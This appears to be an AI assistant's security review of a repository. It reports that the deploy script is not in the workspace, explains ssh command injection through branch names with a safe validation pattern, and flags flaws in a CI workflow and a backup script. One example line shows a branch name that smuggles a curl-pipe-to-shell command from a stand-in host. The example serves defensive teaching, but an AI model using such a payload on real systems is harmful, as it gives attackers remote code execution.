I couldn't find the deploy script in this workspace. Nothing in the repo calls `ssh` or builds a command from a branch name. Here's what I checked:

- `scripts/backup.sh` is the only shell script. It's a nightly backup that uses `scp`, not a deploy.
- `.github/workflows/deploy.yml` is named "deploy," but all it does is `echo` the PR title.
- `Jenkinsfile` runs `make build`, and `.gitlab-ci.yml` runs `npm ci` and `npm run build`. Neither uses ssh.

It may be in another branch, another repo, or not committed yet. If you paste it or give me the path, I'll review it properly.

## What to fix in the script you described

Putting a branch name into an ssh command string is command injection. Anyone who can push a branch can choose its name, and git allows `;`, `$( )`, backticks and `|` in branch names. ssh joins its arguments into one string and the remote login shell parses it again, so quoting it on your side doesn't protect you:

```bash
# Unsafe: a branch named  x;curl evil|sh  runs on the deploy host
ssh deploy@host "cd /srv/app && git checkout $BRANCH && ./restart.sh"
```

The safe pattern:

```bash
branch="${1:?usage: deploy.sh BRANCH}"
# Reject anything outside an allowlist; don't try to clean it up
if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* || ${branch} == *..* ]]; then
  printf 'invalid branch: %q\n' "${branch}" >&2
  exit 2
fi
# Quote it for the remote shell as well
ssh -- deploy@host "cd /srv/app && git checkout -- $(printf '%q' "${branch}") && ./restart.sh"
```

Better still, have the remote side receive the branch as data, not code: a fixed script on the host with a `command=` restriction in `authorized_keys` that reads the value from `SSH_ORIGINAL_COMMAND` and validates it again there.

## Other problems I found in the repo

**`.github/workflows/deploy.yml`** has an injection of the same kind:
- **Line 14:** `${{ github.event.pull_request.title }}` is pasted directly into the shell in the `run:` step, so any PR author can run commands in CI. Pass the title in through `env:` (`TITLE: ${{ … }}`) and use `"$TITLE"` instead.
- **Line 7:** `permissions: write-all` on a `pull_request` trigger. Cut it back to `contents: read`.

**`scripts/backup.sh`:**
- There's no `set -Eeuo pipefail`. If `tar` fails, the script still `scp`s a broken archive and exits 0.
- `/tmp/backup.$$` is a predictable name, open to a symlink or TOCTOU attack. Use `mktemp -d` instead.
- The temp directory is only removed at the end. Clean it up from a `trap … EXIT` so it's also removed when the script fails partway.
- No expansions are quoted, and it uses backticks. Switch to `"$(date +%F)"`.
- It doesn't set `PATH` or `umask`, which matters because it runs from cron. The archive is created with default permissions.

I haven't run `shellcheck` or `bash -n` on anything, because I haven't edited any files. Send me the deploy script and I can write the fix and check it, along with the two issues above if you want.
